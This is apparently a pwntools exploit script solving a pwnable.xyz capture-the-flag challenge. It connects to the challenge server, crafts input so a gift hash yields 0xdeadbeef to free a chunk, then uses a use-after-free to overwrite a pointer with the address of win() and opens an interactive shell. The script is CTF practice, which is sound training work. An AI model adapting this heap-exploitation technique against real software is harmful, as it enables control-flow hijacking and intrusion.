from pwn import *

LOCAL = False

if LOCAL:
    r = process('./release/challenge')
else:
    r = remote('svc.pwnable.xyz', 30034)

sla = r.sendlineafter
sa = r.sendafter

win = 0x400cae


# free reznor chunk

sa('@you> ', '/gift\n')

# hash_gift() returns 0xdeadbeef
gift = '\xde' * (0x100 - 0xad)
gift += '\xdf' * 0xad
gift += '\xbe' * (0x100 - 0xef)
gift += '\xbf' * 0xef

sla('Ok, how expensive will your gift be: ', str(0x200))
sa('Enter your gift: ', gift)


# UAF -> call win()

sa('@you> ', '/gift\n')
sla('Ok, how expensive will your gift be: ', str(0x27))
sa('Enter your gift: ', b'A' * 8 + p64(win))

sa('@you> ', '\n')


r.interactive()